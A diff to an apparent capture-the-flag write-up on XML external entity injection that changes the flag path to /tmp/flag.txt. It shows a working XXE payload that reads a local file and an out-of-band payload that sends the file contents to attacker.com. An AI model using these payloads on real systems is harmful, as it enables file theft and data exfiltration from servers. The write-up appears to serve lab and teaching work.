@@ -17,7 +17,7 @@ Document doc = builder.parse(new ByteArrayInputStream(xmlInput.getBytes("UTF-8")
 ## Exploitation Steps
 
 ### Step 1: Understand the Target
-- The flag is stored at `/app/flag.txt`
+- The flag is stored at `/tmp/flag.txt`
 - The application parses XML and extracts `<name>` elements
 - We can define external entities to read files
 
@@ -25,7 +25,7 @@ Document doc = builder.parse(new ByteArrayInputStream(xmlInput.getBytes("UTF-8")
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE products [
-  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
+  <!ENTITY xxe SYSTEM "file:///tmp/flag.txt">
 ]>
 <products>
   <name>&xxe;</name>
@@ -55,7 +55,7 @@ Document doc = builder.parse(new ByteArrayInputStream(xmlInput.getBytes("UTF-8")
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE products [
-  <!ENTITY % file SYSTEM "file:///app/flag.txt">
+  <!ENTITY % file SYSTEM "file:///tmp/flag.txt">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
   %eval;
   %exfil;
